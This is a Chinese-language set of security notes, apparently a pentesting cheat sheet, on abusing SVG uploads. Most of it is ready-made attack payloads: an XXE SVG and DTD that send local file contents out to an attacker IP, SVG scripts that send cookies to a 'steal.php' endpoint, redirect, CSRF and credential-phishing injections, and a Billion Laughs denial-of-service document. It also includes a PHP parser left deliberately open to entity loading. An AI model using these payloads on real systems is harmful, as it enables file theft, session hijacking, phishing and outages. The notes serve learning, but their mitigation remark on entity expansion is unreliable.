

* SVG 本身就是xml結構，可以定義實體。 

* SVG 可以放JS  造成XSS

* SVG HTML 注入。

若是網站上可以上傳SVG 就要小心XSS


Web浏览器中，默认情况下是禁用外部实体加载的。SVG解析器通常不会加载外部实体，这是为了防止XXE漏洞。

但若是後端啟用了xml加載，那就完了。

对于PHP中的libxml_disable_entity_loader(false);，它的作用是启用实体加载功能。libxml_disable_entity_loader() 函数用于在PHP中控制XML解析器是否允许加载外部实体，当参数设置为false时，表示允许加载外部实体


## 1.XXE利用
後端如果可以上傳SVG，還啟用XML實體，那麼很棒。


### xxe.php
```php=
<?php
	libxml_disable_entity_loader(false);
	$xmlfile = file_get_contents('php://input');
	$dom = new DOMDocument();
	$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
?>

```
利用偽協議`php://input`寫入 xml





### 遠端放或是本地寫入一個hack.dtd(看情況)
功能:OOB帶出數據
```dtd=
<!ENTITY % all "<!ENTITY  send SYSTEM 'http://192.168.43.84/%file;'>">
```


### svg檔

```xml=
<?xml version = "1.0"?>
<!DOCTYPE foo [

	<!ELEMENT foo ANY >
    
	<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///C:/Users/liar/Desktop/123.txt" >

	<!ENTITY % remote SYSTEM "file:///C:/Users/liar/Desktop/hack.dtd" >

	%remote;
	%all;


]>

<svg>&send;</svg>
```




## XSS利用
若是圖片上傳，可以被載入html中，會造成xss


### 第一種網頁使用object tag去抓svg檔
```hmtl=
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>

<strong>SVG test page</strong>
<br><br>
<object data="http://pika/test.svg"></object>



</body>
</html>
```


* svg檔 
抓cookie丟到attacker伺服器。
* 注意:雖說瀏覽器啟用了cors政策，但沒用cors是對資源載入使用的，我們是請求夾帶資料到attacker並且用log記下來了。

```svg=
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <circle cx="100" cy="50" r="40" stroke="black" stroke-width="2" fill="black" />
    <script>

    	
        // 恶意脚本：获取用户的Cookie并发送到攻击者服务器
        const cookie = "11111111";
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://192.168.43.84/steal.php?cookie=' + encodeURIComponent(cookie), true);
        xhr.send();
        
    </script>
</svg>

```


### 第二種:直接嵌入svg

```htmlembedded=
<!DOCTYPE html>
<html>
<head>
	<title></title>
</head>
<body>

<strong>SVG test page</strong>
<br><br>

<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <circle cx="100" cy="50" r="40" stroke="black" stroke-width="2" fill="black" />
    <script>

    	
        // 恶意脚本：获取用户的Cookie并发送到攻击者服务器
        const cookie = "11111111";
        const xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://192.168.43.84/steal.php?cookie=' + encodeURIComponent(cookie), true);
        xhr.send();
        
    </script>
</svg>


</body>
</html>
```




## html 注入利用
### 通常用來
1. csrf 
2. 網頁跳轉
3. 釣魚帳密

### 先看svg架構


`<foreignObject>`是SVG（Scalable Vector Graphics）中的一个元素，它允许在SVG图像中嵌入HTML内容。使用`<foreignObject>`元素，你可以在SVG中插入常规的HTML标记、文本、表单元素等，从而实现更复杂的图形和交互效果。

`<foreignObject>`元素可以用于在SVG图像中嵌入与SVG本身不直接相关的内容，比如在SVG图像中插入一个HTML表单、文本区域、图像、按钮等。这为开发者提供了更多创意和交互的可能性，使得SVG图像能够更加灵活和丰富。







```xml=
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100">
  <rect x="0" y="0" width="200" height="100" fill="lightblue" />

  <foreignObject x="10" y="10" width="180" height="80">
    <div xmlns="http://www.w3.org/1999/xhtml" style="font-size: 18px; color: white;">
      
    	

    	<!-- payload here -->


    </div>

  </foreignObject>
</svg>


```

### payload:
1.
```htmlembedded=
<!-- 網頁跳轉 或是csrf (看你想怎樣) -->
<meta http-equiv="refresh" content="5; URL=http://192.168.43.84/2222222222222222">

```
2.
```htmlembedded=
<!-- a tag 也是同樣跳轉或是csrf (看你想怎樣) -->
<a href="1111111">clickhere</a>
```

3.
```htmlembedded=
<!-- from 表單也可以get方法來釣魚帳密。 -->
<!-- 或是受害者網站上的csrf  -->

    <form action="http://192.168.43.84/login" method="get">
        
        <!-- 隐藏的用户名输入框 -->
        <input type="hidden" name="username" value="your_username">
        
        <!-- 隐藏的密码输入框 -->
        <input type="hidden" name="password" value="your_password">
        
        <!-- 提交按钮 -->
        <input type="submit" value="send">
        	
    </form>

```

### 前面舉的是直接嵌入的svg

當然也可以是載入的svg 看具體情況使用。
```htmlembedded=
<!DOCTYPE html>
<html>
<head>
    <title>Object标签加载SVG示例</title>
</head>
<body>
    <h1>SVG图像</h1>
    <object data="example.svg" type="image/svg+xml" width="400" height="300">
    </object>
</body>
</html>

```




請記住 svg 如果通常後端有xml實體加載通常可以造成ssrf。



## Billion Laughs Attack
這我沒測過，我怕把我電腦弄壞。


簡易版:
```
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
]>
<lolz>&lol1;</lolz>

```


上面的代码是一个简单的 Billion Laughs 攻击示例。让我们逐步分解代码，以了解每个步骤的含义：

1. `<!DOCTYPE lolz [`：这是 XML 文档的文档类型定义（DTD）部分的开始标签。DTD 允许定义实体和其他元素规则。

2. `<!ENTITY lol "lol">`：在 DTD 中定义了一个名为 `lol` 的实体，它的值是 "lol"。这个实体定义了一个名为 `lol` 的变量，可以在 XML 文档中引用。

3. `<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">`：在 DTD 中定义了另一个名为 `lol1` 的实体，它的值是对 `&lol;` 的引用，重复了十次。这个实体定义了一个名为 `lol1` 的变量，它递归地引用了实体 `lol` 十次。

4. `]>`：DTD 部分的结束标签。

5. `<lolz>&lol1;</lolz>`：在 XML 文档中，我们使用 `&lol1;` 这个实体引用，并将它放在 `<lolz>` 元素中。这会导致实体 `lol1` 被递归展开十次，最终生成大量的 "lol" 字符串。

整个过程如下：

- 解析器读取文档类型定义（DTD），在其中找到实体的定义。
- 解析器在 `<lolz>` 元素中遇到 `&lol1;` 这个实体引用。
- 解析器查找实体 `lol1` 的定义，发现它引用了 `&lol;` 十次。
- 解析器查找实体 `lol` 的定义，找到它的值是 "lol"。
- 解析器将实体 `lol1` 展开为十个 `&lol;`，每个 `&lol;` 展开为 "lol"。
- 最终，`<lolz>` 元素中的内容被展开为 "lollollollollollollollollollol"，其中 "lol" 重复了十次。

这样的递归展开会导致服务器不断重复处理字符串 "lol"，耗尽系统资源，可能导致拒绝服务（DoS）攻击。因此，Billion Laughs 攻击是一种危险的实体扩展攻击，需要注意防范。要防止这种攻击，可以禁用外部实体加载并且对用户提供的 XML 数据进行严格的验证和过滤。





真實情況:
```
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

10 的 9 次方是 1,000,000,000，也就是 10 亿。













## 參考
https://www.secpulse.com/archives/147761.html

https://www.anquanke.com/post/id/190651

https://github.com/allanlw/svg-cheatsheet


https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery


https://cloud.tencent.com/developer/article/2219951
